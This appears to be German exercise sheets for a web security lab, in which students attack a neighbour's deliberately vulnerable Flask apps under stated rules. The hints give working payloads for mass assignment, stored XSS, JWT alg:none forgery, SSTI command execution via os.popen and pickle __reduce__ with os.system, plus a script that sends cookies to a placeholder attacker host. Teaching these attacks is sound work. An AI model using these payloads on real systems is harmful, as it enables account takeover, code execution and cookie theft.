#01 A01 Broken Access Control Port :5005 leicht

Mass Assignment

Ziel dieser Übung: Zeigt, dass ein Formular mehr Felder entgegennehmen kann, als es anzeigt. Beim Registrieren schmuggelt ihr ein zusätzliches Feld mit und werdet dadurch Administrator — obwohl das Formular gar keinen „Admin"-Haken hat.

Aufbau: Jede:r startet die App auf dem eigenen Rechner; der/die Nachbar:in greift diese Instanz an.

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5005

Spielregeln

  • Nur die eingeladene Instanz. Nur fiktive Konten. Kein DoS, keine Fremddaten.
  • Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Die Registrierung zeigt nur Benutzername und Passwort. Intern hat ein Konto aber auch ein Feld is_admin (Standard: false). Der Admin-Bereich (/admin) ist nur für Konten mit is_admin = true.

Aufgabe

Lege ein Konto an, das sofort Admin ist, und öffne /admin — ohne dass das Formular eine Admin-Option anbietet.

Hinweis

  • Der Server übernimmt alle gesendeten Formularfelder ins Konto, nicht nur die angezeigten. Was, wenn du ein zusätzliches Feld is_admin mitschickst?
  • Du musst dafür das Formular „erweitern". Zwei einfache Wege:
    • Browser-DevTools: Im Registrier-Formular ein Feld hinzufügen: 
          <input name="is_admin" value="1">
      (F12 → Elements → ins <form> einfügen), dann absenden.
    • Request direkt bauen: 
          curl -i -c cj.txt -d "username=evil&password=x&is_admin=1" http://ZIEL:5005/
    curl -b cj.txt http://ZIEL:5005/admin

Erfolgskriterium

  • Dein frisch registriertes Konto erreicht /admin („… ist Administrator").
  • Du hast dafür nur ein extra Formularfeld mitgeschickt, kein Admin-Konto gekapert.

Zählt nicht als Lösung

  • Ein bereits vorhandenes Admin-Konto übernehmen.
  • /admin ohne gültiges, als Admin markiertes Konto aufrufen.

Ordner: challenge_mass_assignment/ · Start: cd challenge_mass_assignment && python app.py

#02 A03 Injection Port :5002 leicht–mittel

Stored XSS

Ziel dieser Übung: Zeigt, dass ein Eingabefeld gefährlich wird, wenn sein Inhalt später ungeescaped wieder angezeigt wird. Ihr schmuggelt über die Beschreibung eines Tickets JavaScript ein, das bei allen losläuft, die das Ticket danach öffnen (Stored / Persistent XSS).

Aufbau: Jede:r startet die verwundbare App auf dem eigenen Rechner. Der/ die Nachbar:in legt auf eurer Instanz ein Ticket mit einem Payload an; sobald ihr (oder „die Sachbearbeitung") das Ticket anschaut, läuft fremder Code in eurem Browser.

Lokal starten und im Kurs-Netz erreichbar machen:

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5002

(Standard ist 127.0.0.1 = nur lokal. 0.0.0.0 nur im vertrauenswürdigen Kurs-Netz während des Übungstermins.)

Spielregeln

  • Greift ausschließlich die Instanz an, deren Besitzer:in euch ausdrücklich dazu eingeladen hat (euer:e direkte:r Nachbar:in). Keine anderen Rechner/Dienste.
  • Nur fiktive Konten/Inhalte. Keine echten Namen, Passwörter oder personenbezogenen Daten. Legt keine Massen an Tickets an.
  • Kein Denial-of-Service, kein Verändern/Löschen fremder Daten. Die Challenge ist mit einem präparierten Ticket lösbar.
  • Haltet den Payload harmlos (alert); keine echten Schad-Skripte, kein Weiterleiten von Daten an externe Server.
  • Nur während des vorgesehenen Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Das Ticketsystem zeigt die Beschreibung eines Tickets auf der Detailseite an und schreibt sie beim Bearbeiten zurück ins Formular. Du kannst Tickets anlegen und ansehen.

Aufgabe

Lege ein Ticket an, dessen Beschreibung so präpariert ist, dass beim Öffnen des Tickets JavaScript ausgeführt wird — sichtbar durch ein alert('XSS').

Hinweis

  • Nicht das Eingabefeld ist entscheidend, sondern **wo die Beschreibung wieder ausgegeben wird. Schau dir den Quelltext der Ticket-Detailseite** an (Rechtsklick → Seitenquelltext / F12 → Elements) und suche deinen Text.
  • Steht er dort roh (<img …> statt &lt;img …&gt;), wird nicht escaped → dein HTML wird Teil der Seite.
  • Ein Payload, der beim Laden feuert, ist zuverlässiger als einer, der auf einen Fehler wartet: 
      <img src=x onerror=alert('XSS')>
  • Achte auf den Kontext: Auf der Detailseite landet die Beschreibung in einem normalen Absatz (<p>) — da reicht der Payload direkt. Im Bearbeiten- Formular steht sie in einem <textarea>; dort musst du es erst schließen: 
      </textarea><img src=x onerror=alert('XSS')>

Erfolgskriterium

  • Du hast ein Ticket mit präparierter Beschreibung gespeichert.
  • Beim Öffnen dieses Tickets erscheint ein alert('XSS') — ohne dass du sonst etwas anklickst.
  • Der Payload steht im Seitenquelltext roh (nicht escaped).

Zählt nicht als Lösung

  • Den Payload nur ins Formular tippen und im <textarea> „sehen" (dort ist er als Formular-Wert escaped — das ist normal und keine Lücke).
  • alert über die Browser-Konsole selbst auslösen.
  • Die Seite lokal im Editor verändern (DevTools-DOM-Edit) — es muss aus den gespeicherten Ticketdaten kommen.

Kür (Impact zeigen)

Dieses System legt die Identität in einem Klartext-Cookie username ohne HttpOnly ab. Damit lässt sich der Cookie per XSS auslesen:

<img src=x onerror=alert(document.cookie)>

Zeigt der Alert username=…, könnte ein echter Angreifer die Identität stehlen/übernehmen. (Deshalb: HttpOnly setzen.)

#04 A04 Insecure Design Port :5008 mittel

Race Condition (TOCTOU)

Ziel dieser Übung: Zeigt, dass „erst prüfen, dann abbuchen" nicht reicht, wenn mehrere Anfragen gleichzeitig ankommen. Ihr hebt von einem Konto mit 100 Gold mehr als 100 Gold ab.

Aufbau: Jede:r startet die App auf dem eigenen Rechner; der/die Nachbar:in greift diese Instanz an.

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5008

Spielregeln

  • Nur die eingeladene Instanz. Kein DoS: höchstens ~20 parallele Requests.
  • Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Die Goldbank gibt jedem Besucher ein Konto mit 100 Gold. Am Schalter kann man abheben — das Gold wandert in die Satteltasche. Die Bank prüft brav, ob genug auf dem Konto liegt. Die Buchung dauert aber einen Moment …

Aufgabe

Bring mehr als 100 Gold in deine Satteltasche.

Hinweise

  • Zwei Klicks hintereinander reichen nicht — der zweite kommt zu spät.
  • Dein Konto hängt am Cookie spieler. Alle Anfragen müssen ihn mitschicken.
  • Python-Threads (threading oder concurrent.futures) + requests schicken mehrere POSTs auf /abheben praktisch gleichzeitig.

Erfolgskriterium

  • Die Startseite zeigt „Angriff geglückt" mit Satteltasche > 100.

Zählt nicht als Lösung

  • Negative Beträge o. ä. (werden abgelehnt), mehrere Konten zusammenlegen.

#05 A02 Cryptographic Failures Port :5001 mittel

Session-Fälschung

Ziel dieser Übung: Zeigt, dass eine „Login-Pflicht" nichts wert ist, wenn der Session-Cookie nur signiert (nicht verschlüsselt) ist und mit einem schwachen, bekannten SECRET_KEY abgesichert wurde.

Aufbau: Jede:r startet die verwundbare Übungs-App target_session_forgery.py auf dem eigenen Rechner. Der/die Nachbar:in greift genau diese eine Instanz an. Ihr tauscht dafür nur die URL eurer Instanz aus (z. B. http://192.168.x.y:5001).

Lokal starten und im Kurs-Netz erreichbar machen:

$env:HOST = "0.0.0.0"; python app.py

(Standard ist 127.0.0.1 = nur lokal. 0.0.0.0 nur im vertrauenswürdigen Kurs-Netz während des Übungstermins.)

Spielregeln

  • Greift ausschließlich die Instanz an, deren Besitzer:in euch dazu ausdrücklich eingeladen hat (euer:e direkte:r Nachbar:in). Keine anderen Rechner, Ports oder Dienste.
  • Nur die vorgesehenen fiktiven Konten verwenden. Keine echten Namen, Passwörter oder personenbezogenen Daten.
  • Keine Denial-of-Service-Versuche, kein Löschen/Verändern von Daten, keine Massen-Requests. Die Challenge ist mit **einem einzigen, von Hand gebauten Cookie** lösbar.
  • Nur während des dafür vorgesehenen Übungstermins.
  • Dokumentiert euren Lösungsweg kurz (welchen Cookie habt ihr gebaut, warum hat er funktioniert).

Szenario

Auf der Zielinstanz gibt es ein Konto admin mit einem unbekannten, zufälligen Passwort — über das Login-Formular kommt ihr dort also nicht rein. Das Dashboard (/dashboard) verlangt einen Login und leitet euch ohne gültige Session auf /login um.

Ihr kennt kein admin-Passwort, und ein Session-Cookie bekommt ihr regulär nur nach erfolgreichem Login.

Aufgabe

Bringt die Zielseite dazu, euch als admin zu erkennen — das Dashboard soll „Willkommen zurück, admin" anzeigen —, ohne das Passwort von admin zu kennen oder zu verwenden.

Hinweis

  • Der Server legt eure Identität in einem Cookie namens session ab. Schaut ihn euch an (curl -i oder die Entwickler-Tools): Er ist base64-lesbar, aber am Ende steht eine Signatur. Verändert man den Inhalt, passt die Signatur nicht mehr — der Server weist den Cookie ab.
  • Flask verschlüsselt die Session nicht, es signiert sie nur (HMAC, salt cookie-session). Wer den SECRET_KEY kennt, kann einen beliebigen Inhalt selbst gültig signieren.
  • Dieser Key ist hier nicht zufällig, sondern ein **schwacher, „geratener" Standardwert**. Probiert eine kleine Liste naheliegender Keys durch (Projektname, secret, changeme, … — und denkt an das Thema des Labs 😉).
  • Habt ihr den Key, baut einen Cookie mit dem Payload {"user": "admin"} und setzt ihn, bevor ihr /dashboard aufruft.

Erfolgskriterium

  • Ihr habt keinen gültigen Login durchgeführt und kein admin-Passwort verwendet.
  • Ihr habt einen selbst gebauten, gültig signierten session-Cookie gesetzt.
  • Das Dashboard zeigt euch als admin eingeloggt (inkl. Hinweis „Angriff geglückt").

Zählt nicht als Lösung

  • Euch mit dem Testkonto team-test / test123 regulär einloggen.
  • Das admin-Passwort erraten/bruteforcen (ist zufällig, nicht vorgesehen).
  • Den Cookie-Inhalt einfach ändern, ohne neu zu signieren (der Server lehnt ihn ab — genau das ist der Punkt).

Ordner: ../challenge_session_forgery/ · Start: cd ../challenge_session_forgery && python app.py

#06 A01 Broken Access Control Port :5007 mittel

Session-Abuse

Ziel dieser Übung: Zeigt, dass eine Flask-Session gefährlich wird, wenn die App Nutzereingaben ungefiltert in die Session übernimmt. Du beförderst dich selbst vom „Greenhorn" zum Marshal und kommst so ins Admin-Büro — ohne den SECRET_KEY zu kennen und ohne Marshal-Zugangsdaten.

Aufbau: Jede:r startet die App auf dem eigenen Rechner; der/die Nachbar:in greift diese Instanz an.

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5007

(Standard ist 127.0.0.1 = nur lokal. 0.0.0.0 nur im vertrauenswürdigen Kurs-Netz während des Übungstermins.)

Spielregeln

  • Nur die eingeladene Instanz (euer:e direkte:r Nachbar:in). Keine anderen Rechner.
  • Nur das fiktive Konto team-test / test123. Keine echten Daten.
  • Kein DoS, kein Verändern/Löschen fremder Daten. Mit einem Request lösbar.
  • Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Nach dem Login bist du ein Greenhorn (rang=greenhorn). Das Marshal-Büro (/marshal) steht nur dem Rang marshal offen. Es gibt eine Seite Einstellungen, auf der du eigentlich nur deinen Anzeigenamen und deinen Lieblings-Revolver speicherst.

Der Haken: Das SECRET_KEY ist hier stark und zufällig — den Cookie selbst zu fälschen, ist also aussichtslos. Trotzdem gibt es einen Weg.

Aufgabe

Erreiche /marshal als Marshal (rang=marshal), ohne einen Marshal-Login zu kennen und ohne den SECRET_KEY.

Hinweis

  • Schau dir an, was die Einstellungen-Route mit den Formulardaten macht. Sie übernimmt jedes gesendete Feld in die Session — auch Felder, die im Formular gar nicht vorgesehen sind.
  • Die Startseite zeigt dir den kompletten Session-Inhalt an. Beobachte, wie er sich nach dem Speichern verändert.
  • Du musst nichts signieren/fälschen: Schick einfach ein zusätzliches Feld rang mit — der Server packt es in die Session und signiert sie für dich.
  • Im Browser: Einstellungen öffnen, per DevTools (F12 → Elements) ein weiteres Feld ins Formular einfügen … 
      <input name="rang" value="marshal">
    … oder gleich per curl ein Feld mehr mitschicken.

Erfolgskriterium

  • Nach deinem Request zeigt die Startseite Rang: marshal.
  • /marshal liefert HTTP 200 und die geheime Fahndungsliste (nicht 403).
  • Du hast weder den SECRET_KEY benutzt noch einen Marshal-Login gekannt.

Zählt nicht als Lösung

  • Den SECRET_KEY erraten und den Cookie offline fälschen (das ist die andere Challenge challenge_session_forgery / Ordner 13_session_forgery).
  • Den angezeigten Session-Text nur in den DevTools überschreiben (muss aus der gespeicherten Session kommen, also über den Server-Roundtrip).

Kür (Impact zeigen)

Mit demselben Trick lassen sich beliebige Session-Felder setzen — z. B. die Identität übernehmen:

user=marshal-buford&rang=marshal

Zeigt die Startseite danach einen fremden Benutzer mit Marshal-Rang, ist klar: Wer die Session mitbestimmt, bestimmt Identität und Rechte.

#08 A04/A05 Port :5006 mittel

Unrestricted File Upload

Ziel dieser Übung: Zeigt, dass ein Upload ohne Typprüfung gefährlich ist, wenn die Datei danach im Ursprung der App ausgeliefert wird. Ihr ladet eine „Datei" hoch, die beim Öffnen JavaScript im App-Kontext ausführt.

Aufbau: Jede:r startet die App auf dem eigenen Rechner; der/die Nachbar:in greift diese Instanz an.

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5006

Spielregeln

  • Nur die eingeladene Instanz. Nur fiktive, harmlose Dateien (alert).
  • Kein DoS, keine echten Schad-Dateien, keine Massen-Uploads.
  • Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Das Upload-Feld nimmt jede Datei an und liefert sie danach unter /uploads/<name> wieder aus — mit dem Content-Type passend zur Endung. Eine .html wird also als Webseite im selben Ursprung wie die App angezeigt.

Aufgabe

Lade eine Datei hoch, die beim Öffnen JavaScript ausführt (sichtbar durch alert('XSS')) — und zwar auf http://ZIEL:5006/uploads/..., also im Origin der Anwendung.

Hinweis

  • Keine Bild-/Typprüfung → die Endung bestimmt, wie der Browser die Datei behandelt. Was passiert bei .html oder .svg?
  • Lege eine Datei pwn.html an mit: 
      <script>alert('XSS')</script>
    hochladen, dann den Link /uploads/pwn.html öffnen.
  • SVG geht auch: 
      <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>

Erfolgskriterium

  • Beim Öffnen deiner hochgeladenen Datei feuert alert('XSS').
  • Die Seite läuft unter /uploads/..., also im Origin der App (dadurch wären App-Cookies/Session angreifbar).

Zählt nicht als Lösung

  • Eine .html lokal im Browser öffnen (nicht über /uploads/ vom Server).
  • Nur ein Bild hochladen, das nichts ausführt.

Kür (Impact)

Weil die Datei im App-Origin läuft, kann sie App-Cookies lesen/abschicken (sofern nicht HttpOnly). In pwn.html:

<script>new Image().src='http://DEINE-IP:8000/klau?c='+encodeURIComponent(document.cookie)</script>

#09 A02/A07 Port :5004 mittel

JWT-Fälschung

Ziel dieser Übung: Zeigt, dass ein „sicher aussehendes" Token (JWT) wertlos ist, wenn die Prüfung schwach ist. Ihr stellt euch selbst ein Token mit role=admin aus und betretet den Admin-Bereich.

Aufbau: Jede:r startet die App auf dem eigenen Rechner; der/die Nachbar:in greift diese Instanz an.

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5004

Spielregeln

  • Nur die eingeladene Instanz. Nur fiktive Konten. Kein DoS, keine Fremddaten.
  • Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Nach dem Login (team-test / test123) bekommst du ein Token im Cookie token mit role=user. Der Admin-Bereich (/admin) verlangt role=admin. Ein Admin-Passwort kennst du nicht.

Ein JWT besteht aus drei Base64-Teilen: header.payload.signature. Header und Payload sind nur base64-codiert (lesbar/änderbar), die Signatur soll Manipulation verhindern.

Aufgabe

Verschaffe dir Zugang zu /admin, indem du ein eigenes Token mit role=admin vorlegst — ohne Admin-Zugangsdaten.

Hinweis

Es gibt zwei Wege (einer reicht):

1. alg: none — Setze im Header "alg":"none" und lass die Signatur weg (dritter Teil leer). Akzeptiert der Server das, braucht es gar keine Signatur. 2. Schwaches Secret — Das HMAC-Secret ist ein naheliegendes Standardwort. Errätst du es, kannst du ein gültig signiertes Token mit role=admin bauen (z. B. mit jwt.io oder der Bibliothek PyJWT).

Dekodiere zuerst dein aktuelles Token (Payload base64-decoden), ändere role auf admin, und baue es nach einem der beiden Wege neu zusammen. Dann Cookie token auf den neuen Wert setzen und /admin öffnen.

Erfolgskriterium

  • /admin zeigt den Admin-Bereich („Angriff geglückt … role=admin").
  • Du hast kein Admin-Passwort verwendet, sondern das Token selbst erzeugt.

Zählt nicht als Lösung

  • Den vorhandenen role=user-Token unverändert benutzen.
  • Nur den Payload ändern, aber die Signatur so lassen (wird bei korrektem Server abgelehnt — hier klappt es nur über alg:none oder das richtige Secret).

Ordner: challenge_jwt/ · Start: cd challenge_jwt && python app.py

#10 A10 SSRF Port :5011 mittel

Server-Side Request Forgery

Ziel dieser Übung: Zeigt, wie man den Server dazu bringt, URLs abzurufen, die nur er erreicht. Ein „Steckbrief-Importer" lädt Bilder per URL — und lädt genauso bereitwillig die interne Marshal-Seite.

Aufbau: Jede:r startet die App auf dem eigenen Rechner; der/die Nachbar:in greift diese Instanz an.

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5011

Spielregeln

  • Nur die eingeladene Instanz. Keine echten/fremden URLs abrufen lassen.
  • Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Der Importer holt ein Foto von einer angegebenen url. Das interne Marshal-Board /intern beantwortet Anfragen nur, wenn sie von localhost kommen — von außen gibt es 403. Auf dem Server läuft alles unter 127.0.0.1.

Aufgabe

Lies den Inhalt von /intern, obwohl er dir direkt 403 liefert.

Hinweise

  • Ruf /intern erst direkt auf — du bekommst 403.
  • Der Importer macht die Anfrage für dich, vom Server aus. Welche Absender- Adresse sieht /intern dann?
  • Welche url müsstest du dem Importer geben, damit er sich quasi selbst aufruft? Der Server lauscht lokal auf seinem eigenen Port.

Erfolgskriterium

  • /intern direkt von localhost aufrufen (wenn du selbst auf dem Server sitzt). Der Angriff muss über den Importer laufen.

#11 A03 Injection Port :5003 mittel–schwer

SSTI → RCE

Ziel dieser Übung: Zeigt, dass eine Seite den Server übernehmen lässt, wenn sie eure Eingabe nicht als Daten, sondern als Template-Code behandelt. Aus einem harmlosen „Visitenkarten-Generator" wird so Code-Ausführung.

Aufbau: Jede:r startet die App auf dem eigenen Rechner. Der/die Nachbar:in greift genau diese Instanz an.

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5003

(Standard 127.0.0.1 = nur lokal. 0.0.0.0 nur im Kurs-Netz während des Termins.)

Spielregeln

  • Nur die Instanz angreifen, zu der ihr eingeladen wurdet. Keine anderen Dienste.
  • Nur fiktive Eingaben. Kein DoS, kein Löschen/Verändern von Systemdateien.
  • Befehle harmlos halten (whoami, id, hostname) — nichts Zerstörerisches, keine Daten abfließen lassen.
  • Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Der „Visitenkarten-Generator" nimmt deinen Namen und baut daraus eine Begrüßung. Probiere aus, was mit dem Namen passiert — wird er nur eingesetzt oder auch ausgewertet?

Aufgabe

Bringt die Seite dazu, auf dem Server beliebigen Python-Code auszuführen (z. B. den Benutzernamen des Server-Prozesses über whoami anzeigen) — nur über das Namensfeld.

Hinweis

  • Teste zuerst, ob gerechnet wird: Name = {{7*7}}. Erscheint 49, wird deine Eingabe als Template ausgewertet → SSTI.
  • Die Template-Engine ist Jinja2 (Flask). Über eingebaute Objekte kommst du an Python-Module heran.
  • Eskalation: {{ config }} zeigt die Flask-Konfiguration (inkl. Geheimnisse).
  • Für Befehle führt ein Weg über ein Jinja-Global zu os: 
      {{ lipsum.__globals__.os.popen('whoami').read() }}

Erfolgskriterium

  • {{7*7}} liefert 49 (SSTI bewiesen).
  • Ein Payload zeigt die Ausgabe eines Betriebssystem-Befehls (z. B. whoami) auf der Seite.

Zählt nicht als Lösung

  • Nur {{7*7}} → 49 (das ist der Nachweis, noch nicht die „Übernahme").
  • Code über die Konsole/lokal ausführen statt über das Namensfeld.

#12 A08 Integrity Failures Port :5012 mittel–schwer

Insecure Deserialization

Ziel dieser Übung: Zeigt, warum man pickle niemals auf Daten anwendet, die vom Client kommen. Die Merkliste steckt als pickle-Objekt im Cookie — ein präpariertes Cookie führt beim Entpacken Server-Code aus.

Aufbau: Jede:r startet die App auf dem eigenen Rechner; der/die Nachbar:in greift diese Instanz an.

$env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5012

Spielregeln

  • Nur die eingeladene Instanz. Payload harmlos halten (Markierungsdatei anlegen, whoami) — kein echter Schaden, kein DoS.
  • Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

Szenario

Die App speichert deine Merkliste im Cookie merkliste — als base64-kodiertes pickle-Objekt. Bei jedem Aufruf ruft der Server pickle.loads() darauf auf, um die Liste wiederherzustellen.

Aufgabe

Bring den Server dazu, beim Laden deines Cookies Code auszuführen. Als Beweis soll die Datei pwned.txt im App-Ordner entstehen — die Startseite zeigt dann „Angriff geglückt".

Hinweise

  • pickle.loads ist kein reines „Daten lesen" — beim Entpacken kann ein Objekt über __reduce__ festlegen, wie es wiederhergestellt wird.
  • Ein __reduce__, das (os.system, ("...",)) zurückgibt, läuft beim Entpacken.
  • Baue das Cookie lokal mit demselben pickle + base64 und setze es im Request.

Erfolgskriterium

  • pwned.txt existiert, Startseite meldet „Angriff geglückt".

Zählt nicht als Lösung

  • pwned.txt von Hand anlegen; destruktive oder systemverändernde Payloads.

Ordner: challenge_pickle/ · Start: cd challenge_pickle && python app.py
